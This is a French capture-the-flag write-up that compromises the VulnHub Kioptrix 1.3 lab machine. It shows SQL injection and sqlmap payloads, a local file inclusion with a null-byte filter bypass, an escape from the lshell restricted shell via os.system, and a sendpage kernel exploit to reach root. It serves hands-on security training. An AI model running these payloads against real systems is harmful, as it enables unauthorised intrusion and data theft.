# Solution du CTF Kioptrix: 1.3 de VulnHub

Il est tant de boucler les *Kioptrix* existants avec ce [level 1.3](https://www.vulnhub.com/entry/kioptrix-level-13-4,25/) publié en février 2012.  

It's Gonna Be Alright
---------------------

```plain
Nmap scan report for 192.168.1.39
Host is up (0.00021s latency).
Not shown: 39524 closed ports, 26007 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:91:F5:1F (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2018-02-14T05:23:21-05:00
| smb-security-mode: 
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
```

Sur la page d'index du site se trouve une mire de connexion dont le champ password est vulnérable à une faille SQL :  

```plain
[*] Lancement du module sql
---
Injection MySQL dans http://192.168.1.39/checklogin.php via une injection dans le paramètre mypassword
Evil request:
    POST /checklogin.php HTTP/1.1
    Host: 192.168.1.39
    Referer: http://192.168.1.39/
    Content-Type: application/x-www-form-urlencoded

    myusername=default&mypassword=%C2%BF%27%22%28&Submit=Login
---
```

On peut bypasser l'authentification en mettant par exemple l'utilisateur *admin* et *' or 1 #* comme password mais alors on obtient l'erreur suivante :  

```plain
Oups, something went wrong with your member's page account.
Please contact your local Administrator to fix the issue.
```

Regardons avec sqlmap ce que cette base de données a dans le ventre :  

```plain
---
Parameter: mypassword (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: myusername=admin&mypassword=-9510' OR 8773=8773#&Submit=Login

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: myusername=admin&mypassword=ddd' OR SLEEP(5)-- gvLi&Submit=Login
---
```

L'utilisateur utilisé est *root@localhost*, sans mot de passe.  

Il y a une table intéressante :  

```plain
Database: members
Table: members
[2 entries]
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+----+----------+-----------------------+
```

Ce qui permet de s'authentifier comme *john* sur l'appli web... mais ça ne nous apporte rien de plus... si ce n'est nous dire qu'on est *john*.  

Une petite énumération SMB au cas où :  

```plain
msf auxiliary(smb_enumusers) > show options

Module options (auxiliary/scanner/smb/smb_enumusers):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     192.168.1.39     yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass    MyNameIsJohn     no        The password for the specified username
   SMBUser    john             no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf auxiliary(smb_enumusers) > exploit

[*] 192.168.1.39:139      - 192.168.1.39 KIOPTRIX4 [ nobody, robert, root, john, loneferret ] ( LockoutTries=0 PasswordMin=5 )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Strength To Endure
------------------

Il y a un utilisateur *john* comme sur le site qui a bien sûr le même mot de passe :  

```plain
$  ssh john@192.168.1.39
john@192.168.1.39's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
john:~$ ls -al
total 28
drwxr-xr-x 2 john john 4096 Feb  4  2012 .
drwxr-xr-x 5 root root 4096 Feb  4  2012 ..
-rw------- 1 john john   61 Feb  4  2012 .bash_history
-rw-r--r-- 1 john john  220 Feb  4  2012 .bash_logout
-rw-r--r-- 1 john john 2940 Feb  4  2012 .bashrc
-rw-r--r-- 1 john john  118 Feb 14 05:43 .lhistory
-rw-r--r-- 1 john john  586 Feb  4  2012 .profile
john:~$ cat .lhistory
*** unknown command: cat
john:~$ ll; cat .lhistory
*** forbidden syntax -> "ll; cat .lhistory"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
john:~$ ls | cat .lhistory
*** forbidden syntax -> "ls | cat .lhistory"
*** Kicked out
Connection to 192.168.1.39 closed.
```

Hmmm drôle de shell. Et il semble que l'on ne puisse pas le bypasser :  

```plain
$ ssh john@192.168.1.39 -C /bin/bash
john@192.168.1.39's password: 
*** forbidden path over SSH: "/bin/bash"
This incident has been reported.
$ scp backdoor.php john@192.168.1.39:/tmp/
john@192.168.1.39's password: 
*** forbidden path over SSH: "scp -t /tmp/"
This incident has been reported.
lost connection
```

J'ai choisi de retourner sur le site et d'utiliser le module *buster* de *Wapiti* :  

```plain
[*] Lancement du module buster
Found webpage http://192.168.1.39/images/
Found webpage http://192.168.1.39/index
Found webpage http://192.168.1.39/logout.php
Found webpage http://192.168.1.39/member
Found webpage http://192.168.1.39/logout
Found webpage http://192.168.1.39/member.php
Found webpage http://192.168.1.39/john/
Found webpage http://192.168.1.39/database.sql
Found webpage http://192.168.1.39/john/john
```

En se rendant sur ces pages on comprend que */john/john* est en réalité */john/john.php* qui est la page affichée une fois que l'on est identifié...  

L'utilisateur *robert* a aussi sa page *robert/robert.php*.  

L'URL de la page quand on est connecté est du type */member.php?username=nom\_de\_l\_utilisateur* ce qui laisse supposer que *member.php* fait une inclusion de *$user/$user.php*.  

Si on saisie l'adresse */member.php?username=/etc/passwd* on obtient le message *User //passwd* comme si le *etc* avait été retiré...  

Ce qui se confirme avec l'adresse */member.php?username=/etetcc/passwd*  

```plain
Warning: include(/etc/passwd//etc/passwd.php) [function.include]: failed to open stream: Not a directory in /var/www/member.php on line 14

Warning: include() [function.include]: Failed opening '/etc/passwd//etc/passwd.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/member.php on line 14
```

 Il ne reste plus qu'à se débarrasser du doublon avec */member.php?username=/etetcc/passwd%00* et là bingo:  

```plain
loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/kshell
robert:x:1002:1002:,,,:/home/robert:/bin/kshell
```

Il doit s'agir d'une version un peu ancienne de PHP car il me semble qu'injecter des null bytes n'est plus possible...  

Dans tous les cas inclure des fichiers c'est bien mais ici impossible d'inclure une URL distante et les wrappers PHP ne fonctionnent pas...  

I Won't Let It Happen
---------------------

Injecter dans les logs ? J'avoue j'ai eu la flemme, je suis retourné fouiller un peu ce shell restreint jusqu'à obtenir une erreur intéressante :  

```plain
john:~$ cd -h
lshell: -h: No such file or directory
```

*lshell* ? WUT ? what is this ?  

Une recherche *DuckDuckGo* plus tard on apprend que c'est un shell restreint développé en Python.  

J'ai traîné dans les issues du [Github](https://github.com/ghantoos/lshell/) à la recherche de vulnérabilités mais aucune n'a fonctionné ici :-/   

Pas trop grave car il y a [un exploit](https://www.exploit-db.com/exploits/39632/) correspondant au *lshell* du CTF :  

```plain
$ python 39632.py john MyNameIsJohn 192.168.1.39
[!] .............................
[!] lshell <= 0.9.15 remote shell.
[!] note: you can also ssh in and execute '/bin/bash'
[!] .............................
[!] Checking host 192.168.1.39...
[+] vulnerable lshell found, preparing pseudo-shell...
$ ls -al
total 28
drwxr-xr-x 2 john john 4096 2012-02-04 18:39 .
drwxr-xr-x 5 root root 4096 2012-02-04 18:05 ..
-rw------- 1 john john   61 2012-02-04 23:31 .bash_history
-rw-r--r-- 1 john john  220 2012-02-04 18:04 .bash_logout
-rw-r--r-- 1 john john 2940 2012-02-04 18:04 .bashrc
-rw-r--r-- 1 john john 1530 2018-02-14 21:26 .lhistory
-rw-r--r-- 1 john john  586 2012-02-04 18:04 .profile
```

Mais l'exploit se montre assez peu utilisable... En cherchant bien il y a une astuce qui s'avère bien plus pratique comme indiquée [ici](http://blog.en.hacker.lk/2012/06/how-i-understood-what-happened-in.html) :  

```plain
john:~$ echo os.system("/bin/sh")
$ id
uid=1001(john) gid=1001(john) groups=1001(john)
$ ls -l /root
total 8
-rw-r--r-- 1 root       root        625 Feb  6  2012 congrats.txt
```

Ok... On n'a même plus besoin de passer root ^\_^ Mais quelle époque on vit !  

The Crusher
-----------

Pour le fun on prend l'identité du système :  

```plain
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 8.04.3 LTS
Release:        8.04
Codename:       hardy

Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
```

Ce qui nous mène à l'exploit *sendpage*, sans doute le chemin qu'il aurait fallut prendre si j'avais persisté sur l'inclusion :  

```plain
$ ./sendpage
# id
uid=0(root) gid=0(root) groups=1001(john)
# cd /root
# ls -al
total 44
drwxr-xr-x  4 root       root       4096 Feb  6  2012 .
drwxr-xr-x 21 root       root       4096 Feb  6  2012 ..
-rw-------  1 root       root         59 Feb  6  2012 .bash_history
-rw-r--r--  1 root       root       2227 Oct 20  2007 .bashrc
-rw-r--r--  1 root       root          1 Feb  5  2012 .lhistory
-rw-------  1 root       root          1 Feb  5  2012 .mysql_history
-rw-------  1 root       root          5 Feb  6  2012 .nano_history
-rw-r--r--  1 root       root        141 Oct 20  2007 .profile
drwx------  2 root       root       4096 Feb  6  2012 .ssh
-rw-r--r--  1 root       root        625 Feb  6  2012 congrats.txt
drwxr-xr-x  8 loneferret loneferret 4096 Feb  4  2012 lshell-0.9.12
# cat congrats.txt
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret
```


*Published February 22 2018 at 18:03*